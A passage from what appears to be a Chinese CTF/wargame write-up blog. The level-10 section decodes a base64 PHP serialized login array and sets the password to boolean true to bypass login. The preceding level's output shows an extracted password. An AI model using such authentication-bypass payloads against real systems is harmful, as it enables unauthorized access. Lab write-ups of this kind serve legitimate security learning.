+<p><code>&lt;br&gt;Autor: aaa &lt;br&gt;Title: aaa &lt;br&gt;aaa &lt;br&gt;&lt;br&gt;Autor: TheBlueFlowerthis_oassword_is_SEC//Ure.promised! &lt;br&gt;Title: aaa &lt;br&gt;aaa &lt;br&gt;&lt;br&gt;</code></p>
+<h1 id="level10">level10:</h1>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b633b57236fc43d883fd05a7a2b202f9~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>抓包，发现post数据中的神秘代码
+<code>login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&amp;dologin=Login</code></p>
+<p>login那一串盲猜base64,果不其然是</p>
+<p><code>a:2:{s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;}</code></p>
+<p>这是php的序列化数组，稍微改一下再发包</p>
+<p><code>a:2:{s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;}</code></p>
+<p>提示login incorrect。于是换了好几个sqli万能密码，都没用。看wp，发现只要把password改成True就行了哈哈哈哈</p>
+<p><code>a:2:{s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;}</code></p>
+<p>最后贴一下python base64encode的函数，python里要转成字节流什么的特麻烦</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decode</span>(<span style="color:#8be9fd;font-style:italic">str</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#转成bytes string</span>
+</span></span><span style="display:flex;"><span>    bytesString <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span><span style="color:#ff79c6">.</span>encode(encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#base64 编码</span>
+</span></span><span style="display:flex;"><span>    encodestr <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(bytesString)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> encodestr<span style="color:#ff79c6">.</span>decode()
+</span></span></code></pre></div><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fc5bc0d9800848d7aa900700c6bfecb5~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#level1">level1</a></li>
+    <li><a href="#level2">level2</a></li>
+    <li><a href="#level3">level3</a></li>
+    <li><a href="#level4">level4</a></li>
+    <li><a href="#level5">level5</a></li>
+    <li><a href="#level6二次注入16进制绕过">level6(二次注入+16进制绕过)</a></li>
+    <li><a href="#level7">level7</a></li>
+    <li><a href="#level8">level8</a></li>
+    <li><a href="#level9insert">level9:(insert)</a></li>
+    <li><a href="#level10">level10:</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
